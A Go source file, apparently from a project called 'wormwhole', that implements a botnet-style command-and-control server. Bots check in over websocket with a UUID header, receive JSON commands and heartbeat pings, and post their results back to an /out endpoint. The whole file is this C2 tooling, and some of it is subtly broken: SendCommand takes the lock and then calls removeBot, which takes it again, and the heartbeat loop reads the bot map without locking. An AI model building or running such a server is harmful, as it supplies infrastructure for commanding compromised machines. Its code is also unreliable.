package server

import (
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/xorium/wormwhole/core"
	"io/ioutil"
	"log"
	"net/http"
	"sync"
	"time"
)

func defaultBotEventHandler(b *Bot) {
	log.Println(b)
}

func defaultCommandRespHandler(c *core.Command, data []byte) {
	log.Println(c.ID, string(data))
}

type Bot struct {
	ID   string
	IP   string
	Conn *websocket.Conn
}

type CommandServer struct {
	*sync.RWMutex
	addr            string
	upgrader        websocket.Upgrader
	bots            map[string]*Bot
	currentCommands map[string]*core.Command

	onConnect     func(*Bot)
	onDisconnect  func(*Bot)
	onCommandResp func(*core.Command, []byte)
}

func NewCommandServer(addr string) *CommandServer {
	return &CommandServer{
		RWMutex:         new(sync.RWMutex),
		addr:            addr,
		upgrader:        websocket.Upgrader{},
		bots:            make(map[string]*Bot),
		currentCommands: make(map[string]*core.Command),

		onConnect:     defaultBotEventHandler,
		onDisconnect:  defaultBotEventHandler,
		onCommandResp: defaultCommandRespHandler,
	}
}

func (s *CommandServer) OnConnect(h func(*Bot)) {
	s.Lock()
	s.onConnect = h
	s.Unlock()
}

func (s *CommandServer) OnDisconnect(h func(*Bot)) {
	s.Lock()
	s.onDisconnect = h
	s.Unlock()
}

func (s *CommandServer) OnCommandRespHandler(h func(*core.Command, []byte)) {
	s.Lock()
	s.onCommandResp = h
	s.Unlock()
}

func (s *CommandServer) removeBot(bot *Bot) {
	s.Lock()
	defer s.Unlock()
	delete(s.bots, bot.ID)

	for commandId, command := range s.currentCommands {
		if command.Target() == bot.ID {
			delete(s.currentCommands, commandId)
		}
	}
}

func (s *CommandServer) entrypoint(w http.ResponseWriter, r *http.Request) {
	c, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("upgrade ws connection error:", err)
		return
	}
	botId := r.Header.Get("X-UUID")
	if botId == "" {
		log.Println("connected bot with empty id")
		return
	}
	bot := &Bot{
		ID:   botId,
		IP:   r.RemoteAddr,
		Conn: c,
	}
	log.Println("bot connected: ", bot)
	s.Lock()
	s.bots[bot.ID] = bot
	s.Unlock()
	go s.onConnect(bot)
}

func (s *CommandServer) feedback(w http.ResponseWriter, r *http.Request) {
	defer func() { _, _ = w.Write([]byte("ok")) }()

	query := r.URL.Query()

	commandId := query.Get("cid")
	if commandId == "" {
		return
	}

	s.RLock()
	cmd, ok := s.currentCommands[commandId]
	s.RUnlock()
	if !ok {
		return
	}

	respCode := query.Get("code")
	if respCode == "" {
		respCode = core.CommandResultCodeSuccess
		cmd.SetState(core.CommandStateSuccess)
	}
	if respCode != core.CommandResultCodeSuccess {
		cmd.SetState(core.CommandStateFailed)
		log.Printf("Command %s resp code: %s\n", commandId, respCode)
	}

	respBody := make([]byte, 0)
	if r.Method == http.MethodPost {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			log.Printf("error while reading command %s resp: %v\n", commandId, err.Error())
		} else {
			respBody = body
		}
	}

	go s.onCommandResp(cmd, respBody)
}

func (s *CommandServer) SendCommand(c *core.Command, bot *Bot) error {
	s.Lock()
	defer s.Unlock()

	bot, ok := s.bots[bot.ID]
	if !ok {
		return fmt.Errorf("command %s execution error: unknown bot ID %s", c.Name, bot.ID)
	}

	c.SetState(core.CommandStateExecuting)
	c.SetTarget(bot.ID)
	s.currentCommands[c.ID] = c

	if err := bot.Conn.WriteJSON(c); err != nil {
		log.Printf("can't send command %s to bot %s\n", c.Name, bot.ID)
		go s.onDisconnect(bot)
		s.removeBot(bot)
		delete(s.currentCommands, c.ID)
		return err
	}

	return nil
}

func (s *CommandServer) startHeartBeating() {
	go func() {
		for {
			for _, bot := range s.bots {
				_ = s.SendCommand(PingCommand(), bot)
			}
			time.Sleep(5 * time.Second)
		}
	}()
}

func (s *CommandServer) Run() error {
	http.HandleFunc("/in", s.entrypoint)
	http.HandleFunc("/out", s.feedback)
	s.startHeartBeating()
	return http.ListenAndServe(s.addr, nil)
}
